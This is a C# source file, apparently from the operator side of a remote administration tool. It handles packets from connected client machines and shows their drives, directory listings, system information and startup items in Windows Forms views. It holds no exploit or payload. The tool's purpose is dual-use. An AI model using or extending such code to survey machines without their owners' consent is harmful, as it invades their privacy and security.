using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Extensions;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleDrivesResponse(Client client, DrivesResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.Invoke((MethodInvoker)delegate
            {
                client.Value.FrmFm.cmbDrives.Items.Clear();
                client.Value.FrmFm.cmbDrives.Items.AddRange(packet.Drives);
                client.Value.FrmFm.cmbDrives.SelectedIndex = 0;
            });
        }

        public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
        {
            if (client.Value.FrmFm == null)
                return;

            client.Value.FrmFm.Invoke((MethodInvoker)delegate { client.Value.FrmFm.lstDirectory.Items.Clear(); });

            new Thread(() =>
            {
                ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" })
                {
                    Tag = "dir",
                    ImageIndex = 0
                };

                client.Value.FrmFm.Invoke(
                    (MethodInvoker)delegate { client.Value.FrmFm.lstDirectory.Items.Add(lviBack); });

                if (packet.Folders.Length != 0)
                {
                    for (int i = 0; i < packet.Folders.Length; i++)
                    {
                        if (packet.Folders[i] != DELIMITER)
                        {
                            ListViewItem lvi = new ListViewItem(new string[] { packet.Folders[i], "", "Directory" })
                            {
                                Tag = "dir",
                                ImageIndex = 1
                            };

                            try
                            {
                                client.Value.FrmFm.Invoke(
                                    (MethodInvoker)delegate { client.Value.FrmFm.lstDirectory.Items.Add(lvi); });
                            }
                            catch
                            {
                                break;
                            }
                        }
                    }
                }

                if (packet.Files.Length != 0)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        if (packet.Files[i] != DELIMITER)
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[] { packet.Files[i], Helper.Helper.GetDataSize(packet.FilesSize[i]), "File" })
                                {
                                    Tag = "file",
                                    ImageIndex = Helper.Helper.GetFileIcon(Path.GetExtension(packet.Files[i]))
                                };

                            try
                            {
                                client.Value.FrmFm.Invoke(
                                    (MethodInvoker)delegate { client.Value.FrmFm.lstDirectory.Items.Add(lvi); });
                            }
                            catch
                            {
                                break;
                            }
                        }
                    }
                }

                client.Value.LastDirectorySeen = true;
            }).Start();
        }

        public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
        {
            if (XMLSettings.ShowToolTip)
            {
                try
                {
                    FrmMain.Instance.lstClients.Invoke((MethodInvoker)delegate
                    {
                        foreach (ListViewItem item in FrmMain.Instance.lstClients.Items)
                        {
                            if (item.Tag == client)
                            {
                                var builder = new StringBuilder();
                                for (int i = 0; i < packet.SystemInfos.Length; i += 2)
                                {
                                    if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                                    {
                                        builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
                                    }
                                }
                                item.ToolTipText = builder.ToString();
                            }
                        }
                    });
                }
                catch
                {
                }
            }

            if (client.Value.FrmSi == null)
                return;

            ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
            for (int i = 0, j = 0; i < packet.SystemInfos.Length; i += 2, j++)
            {
                if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
                {
                    lviCollection[j] = new ListViewItem(new string[] { packet.SystemInfos[i], packet.SystemInfos[i + 1] });
                }
            }

            try
            {
                client.Value.FrmSi.Invoke((MethodInvoker)delegate
                {
                    client.Value.FrmSi.lstSystem.Items.RemoveAt(2); // Loading... Information
                    foreach (var lviItem in lviCollection)
                    {
                        if (lviItem != null)
                            client.Value.FrmSi.lstSystem.Items.Add(lviItem);
                    }

                    ListViewExtensions.AutosizeColumns(client.Value.FrmSi.lstSystem);
                });
            }
            catch
            {
            }
        }

        public static void HandleGetStartupItemsResponse(Client client, GetStartupItemsResponse packet)
        {
            if (client.Value.FrmStm == null)
                return;

            try
            {
                foreach (var pair in packet.StartupItems)
                {
                    client.Value.FrmStm.Invoke((MethodInvoker)delegate
                    {
                        var temp = pair.Key.Split(new string[] { "||" }, StringSplitOptions.None);
                        var l = new ListViewItem(temp)
                        {
                            Group = client.Value.FrmStm.lstStartupItems.Groups[pair.Value],
                            Tag = pair.Value
                        };
                        client.Value.FrmStm.lstStartupItems.Items.Add(l);
                    });
                }
            }
            catch
            {
            }
        }
    }
}